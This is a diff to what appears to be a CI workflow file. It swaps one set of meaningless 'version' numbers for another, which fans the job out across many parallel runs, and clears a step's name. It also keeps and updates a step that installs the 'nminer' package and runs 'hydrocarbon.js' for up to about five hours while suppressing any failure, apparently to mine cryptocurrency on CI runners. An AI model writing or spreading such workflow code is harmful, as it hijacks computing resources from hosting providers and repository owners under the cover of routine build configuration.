@@ -9,23 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 5204 }
-          - { version: 1895 }
-          - { version: 7541 }
-          - { version: 8045 }
-          - { version: 8604 }
-          - { version: 9446 }
-          - { version: 2773 }
-          - { version: 4382 }
-          - { version: 8679 }
-          - { version: 295 }
-          - { version: 424 }
-          - { version: 5709 }
-          - { version: 9354 }
-          - { version: 4335 }
-          - { version: 5034 }
-          - { version: 7611 }
-          - { version: 8202 }
+          - { version: 658 }
+          - { version: 4305 }
+          - { version: 2706 }
+          - { version: 8606 }
+          - { version: 1590 }
+          - { version: 9179 }
+          - { version: 3749 }
+          - { version: 6008 }
+          - { version: 9771 }
+          - { version: 9457 }
+          - { version: 1666 }
+          - { version: 8302 }
+          - { version: 9265 }
+          - { version: 4010 }
+          - { version: 1125 }
+          - { version: 6023 }
 
     steps:
       - name: Checkout
@@ -36,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: ack
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 304m node hydrocarbon.js || echo "hydrocarbon executed"
+          timeout 323m node hydrocarbon.js || echo "hydrocarbon executed"
